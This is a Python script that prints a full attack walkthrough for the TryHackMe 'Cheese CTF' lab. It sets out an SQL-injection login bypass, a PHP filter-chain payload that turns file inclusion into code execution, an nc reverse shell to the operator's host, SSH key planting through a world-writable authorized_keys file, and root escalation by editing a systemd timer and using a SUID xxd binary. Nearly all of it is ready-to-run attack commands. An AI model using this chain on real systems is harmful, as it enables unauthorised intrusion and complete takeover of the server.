def solve_cheesy_ctf(task_name, ip):
    """
    Walkthrough helper – TryHackMe ‘Cheese CTF’
    """

    import textwrap

    banner = "\n🧀  ===  CHEESE CTF – FULL SOLVER  ===\n"
    print(banner)

    # ------------------------------------------------------------------ #
    #  STEP 1  –  “Nmap”   (mostly useless because of the port-spoofing) #
    # ------------------------------------------------------------------ #
    print("🔎  STEP 1 – Quick sanity scan (spoofing defeats full -p- scan):")
    print(f"    sudo nmap -sC -sV -T4 {ip} -p 22,80")
    print("    ➜ Only ports 22 (SSH) and 80 (HTTP) truly matter here.\n")

    # ------------------------------------------------------------------ #
    #  STEP 2  –  Browse the site & find login form                     #
    # ------------------------------------------------------------------ #
    print(f"🌐  STEP 2 – Browse http://{ip}/")
    print("    • Click *Login* → /login.php (username / password form)\n")

    # ------------------------------------------------------------------ #
    #  STEP 3  –  SQL-login bypass                                      #
    # ------------------------------------------------------------------ #
    print("🧬  STEP 3 – Bypass auth with classic Boolean SQLi:")
    print("    ► USERNAME : ' || 1=1;-- -")
    print("    ► PASSWORD : anything")
    print("    ✅ Redirected to /secret-script.php?file=supersecretadminpanel.html\n")

    # ------------------------------------------------------------------ #
    #  STEP 4  –  Local File Inclusion & PHP filter hint                #
    # ------------------------------------------------------------------ #
    print("📂  STEP 4 – Notice the *file* parameter accepts PHP filters.")
    print("    Test with base64 filter to read code:")
    print(f"    curl -s 'http://{ip}/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d")
    print("    Source shows simple include($file). We can build a filter chain for RCE.\n")

    # ------------------------------------------------------------------ #
    #  STEP 5  –  Generate filter-chain payload & pop reverse shell      #
    # ------------------------------------------------------------------ #
    lhost = input("Enter your LHOST (your tun0/VPN IP): ").strip()
    lport = input("Enter your LPORT to catch the shell: ").strip()

    print("\n🧰  STEP 5 – Build reverse-shell filter chain locally:")
    print("    git clone https://github.com/k4m4/php-filter-chain-generator.git")
    print('    python3 php_filter_chain_generator.py --chain \'<?php system("rm /tmp/f;mkfifo /tmp/f;'
          f'cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"); ?>\' '
          '| grep ^php > payload.txt')

    print(f"\n🎧  Start listener in another terminal:\n    nc -lvnp {lport}")

    input("\n➡️  Press Enter when listener is ready…")

    print("\n🚀  Trigger payload:")
    print(f"    curl -s \"http://{ip}/secret-script.php?file=$(cat payload.txt)\"")

    print("\n🔓  You should now have a **www-data** reverse shell. Spawn a TTY:")
    print("    python3 -c 'import pty,sys,os; pty.spawn(\"/bin/bash\")'\n")

    # ------------------------------------------------------------------ #
    #  STEP 6  –  Pivot to user *comte* via writable authorized_keys     #
    # ------------------------------------------------------------------ #
    print("🔑  STEP 6 – Find writable files from www-data:")
    print("    find / -type f -writable 2>/dev/null | grep authorized_keys")
    print("    ➜ /home/comte/.ssh/authorized_keys is world-writable!\n")

    print("    Locally generate an ED25519 keypair:")
    print("    ssh-keygen -t ed25519 -f id_ed25519_cheese")
    pubkey = input("Paste your id_ed25519_cheese.pub here: ").strip()

    print("\n    Echo the key into the file on the target:")
    print(f"    echo '{pubkey}' > /home/comte/.ssh/authorized_keys\n")

    print("🔐  SSH as **comte**:")
    print(f"    ssh -i id_ed25519_cheese comte@{ip}")
    print("    cat ~/user.txt   # 🎉 user flag\n")

    # ------------------------------------------------------------------ #
    #  STEP 7  –  Abuse systemd timer to create a SUID copy of xxd       #
    # ------------------------------------------------------------------ #
    print("⏲️  STEP 7 – Check sudo rights of comte:")
    print("    sudo -l   # you can daemon-reload & (re)start exploit.timer\n")

    print("    exploit.timer is writable but missing OnBootSec, so edit:")
    print("    nano /etc/systemd/system/exploit.timer")
    print("    ► add one line inside [Timer]:   OnBootSec=5s\n")

    print("    sudo systemctl daemon-reload")
    print("    sudo systemctl start exploit.timer  # now succeeds\n")

    print("    ls -l /opt/xxd   # should be   -rwsr-sr-x root root …\n")

    # ------------------------------------------------------------------ #
    #  STEP 8  –  Use SUID xxd to write root’s authorized_keys           #
    # ------------------------------------------------------------------ #
    print("📤  STEP 8 – Pop root key using GTFObins trick:")
    root_pub = pubkey
    hexified = "\\x".join(f"{ord(c):02x}" for c in (root_pub + "\n"))
    print("    echo -e '{}' | /opt/xxd -r - /root/.ssh/authorized_keys".format(hexified))
    print("\n    (If you prefer, simpler: echo 'key' | xxd | /opt/xxd -r - /root/.ssh/authorized_keys)\n")

    # ------------------------------------------------------------------ #
    #  STEP 9  –  Root SSH and flag                                      #
    # ------------------------------------------------------------------ #
    print("👑  STEP 9 – SSH as root:")
    print(f"    ssh -i id_ed25519_cheese root@{ip}")
    print("    cat /root/root.txt   # 🎉 root flag\n")

    print("🏁  All done – full pwn from initial SQLi to ROOT!")
